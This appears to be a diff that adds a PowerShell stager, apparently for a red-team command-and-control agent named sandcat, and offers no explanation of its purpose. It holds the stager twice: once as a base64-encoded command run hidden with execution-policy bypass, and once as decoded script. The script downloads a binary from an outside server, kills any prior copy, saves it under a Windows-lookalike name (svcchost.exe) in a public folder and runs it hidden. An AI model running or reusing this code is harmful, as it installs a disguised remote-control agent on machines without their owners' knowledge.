@@ -1,0 +1,12 @@
+powershell -ep bypass -W hidden -enc JHNlcnZlcj0iaHR0cDovL3d3dy53aGl0ZXJhYmJpdHNlYy5jb206ODg4OCI7CiR1cmw9IiRzZXJ2ZXIvZmlsZS9kb3dubG9hZCI7CiR3Yz1OZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50Owokd2MuSGVhZGVycy5hZGQoInBsYXRmb3JtIiwid2luZG93cyIpOwokd2MuSGVhZGVycy5hZGQoImZpbGUiLCJzYW5kY2F0LmdvIik7CiRkYXRhPSR3Yy5Eb3dubG9hZERhdGEoJHVybCk7CmdldC1wcm9jZXNzIHwgPyB7JF8ubW9kdWxlcy5maWxlbmFtZSAtbGlrZSAiQzpcVXNlcnNcUHVibGljXHN2Y2Nob3N0LmV4ZSJ9IHwgc3RvcC1wcm9jZXNzIC1mOwpybSAtZm9yY2UgIkM6XFVzZXJzXFB1YmxpY1xzdmNjaG9zdC5leGUiIC1lYSBpZ25vcmU7Cltpby5maWxlXTo6V3JpdGVBbGxCeXRlcygiQzpcVXNlcnNcUHVibGljXHN2Y2Nob3N0LmV4ZSIsJGRhdGEpIHwgT3V0LU51bGw7ClN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoIEM6XFVzZXJzXFB1YmxpY1xzdmNjaG9zdC5leGUgLUFyZ3VtZW50TGlzdCAiLXNlcnZlciAkc2VydmVyIC1ncm91cCByZWQiIC1XaW5kb3dTdHlsZSBoaWRkZW47
+
+$server="http://www.whiterabbitsec.com:8888";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go");
+$data=$wc.DownloadData($url);
+get-process | ? {$_.modules.filename -like "C:\Users\Public\svcchost.exe"} | stop-process -f;
+rm -force "C:\Users\Public\svcchost.exe" -ea ignore;
+[io.file]::WriteAllBytes("C:\Users\Public\svcchost.exe",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\svcchost.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
